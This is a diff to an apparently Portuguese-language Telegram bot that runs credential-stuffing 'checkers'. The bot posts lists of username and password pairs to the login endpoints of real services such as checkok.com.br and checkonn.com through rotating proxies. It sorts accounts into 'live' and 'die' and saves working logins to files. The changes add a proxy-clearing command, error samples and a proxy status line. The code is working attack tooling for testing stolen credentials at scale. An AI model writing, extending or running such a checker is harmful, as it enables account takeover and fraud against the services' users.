@@ -135,17 +135,16 @@ def _proxy_for(uid):
 
 # ── Checker functions ───────────────────────────────────────────────────────────
 # Each returns ("live"|"die"|"nvinculado"|"erro", extra_str)
+# Logic copied exactly from mul.py; only proxy and return format adapted.
 
 def _chk_checkok(user, pwd, px_fn):
     try:
         r = requests.post(
             "https://bff.checkok.com.br/auth/rok",
-            headers={
-                "accept": "application/json, text/plain, */*",
-                "content-type": "application/json",
-                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
-            },
-            data=f'{{"username":"{user}","password":"{pwd}"}}',
+            headers={"accept": "application/json, text/plain, */*",
+                     "content-type": "application/json",
+                     "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36"},
+            data=f'{{"username": "{user}", "password": "{pwd}"}}',
             proxies=px_fn(), allow_redirects=False, timeout=15,
         )
         return ("live", "") if "negado" not in r.text else ("die", "")
@@ -377,7 +376,7 @@ def _chk_checkonn(user, pwd, px_fn):
     try:
         H = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "accept-language": "pt-BR,pt;q=0.9",
             "origin": "https://app.checkonn.com",
             "referer": "https://app.checkonn.com/intranet/login.php",
@@ -581,6 +580,15 @@ async def cmd_myproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "📤 Envie o arquivo de proxies *.txt*\nFormato: `ip:porta` por linha.",
         parse_mode="Markdown",
+    )
+
+async def cmd_clearproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_auth(uid):
+        return
+    set_user_proxies(uid, "")
+    await update.message.reply_text(
+        "🗑️ Proxies removidos. As checagens agora vão direto, sem proxy."
     )
 
 async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -831,12 +839,15 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim, app):
         name      = CHECKERS[checker]
         lives: list[str] = []
         nvinc: list[str] = []
+        erros: list[str] = []
         checked   = 0
         last_edit = time.time()
 
         prog = await app.bot.send_message(
             chat_id, f"🔄 *{name}* · `0/{total}`", parse_mode="Markdown"
         )
+
+        px_count = len(get_user_proxies(uid))
 
         def px_fn():
             return _proxy_for(uid)
@@ -856,6 +867,8 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim, app):
                 lives.append(entry)
             elif result == "nvinculado":
                 nvinc.append(f"{user}:{pwd}")
+            elif result == "erro" and len(erros) < 5:
+                erros.append(extra)
 
         async def _edit_progress():
             nonlocal last_edit
@@ -895,9 +908,18 @@ async def _run_checker(chat_id, uid, checker, tmp_file, delim, app):
             f"Lives  : {len(lives)}\n"
             f"Dies   : {dies}\n"
             + (f"N.Vinc : {len(nvinc)}\n" if nvinc else "")
+            + f"Proxy  : {'ativo (' + str(px_count) + ')' if px_count else 'desativado'}\n"
             + "```"
         )
         await prog.edit_text(summary, parse_mode="Markdown")
+
+        if erros:
+            erro_txt = "\n".join(f"• `{e}`" for e in erros)
+            await app.bot.send_message(
+                chat_id,
+                f"⚠️ *Amostra de erros encontrados:*\n{erro_txt}",
+                parse_mode="Markdown",
+            )
 
         if lives:
             out = TMP_DIR / f"live_{checker}_{uid}.txt"
@@ -991,7 +1013,8 @@ def main():
 
     app.add_handler(conv)
     app.add_handler(CommandHandler("admin",   cmd_admin))
-    app.add_handler(CommandHandler("myproxy", cmd_myproxy))
+    app.add_handler(CommandHandler("myproxy",    cmd_myproxy))
+    app.add_handler(CommandHandler("clearproxy", cmd_clearproxy))
     app.add_handler(CallbackQueryHandler(on_admin_cb, pattern=r"^(adm:|usr:|auth:|perm:)"))
 
     print("✅ Bot iniciado.")
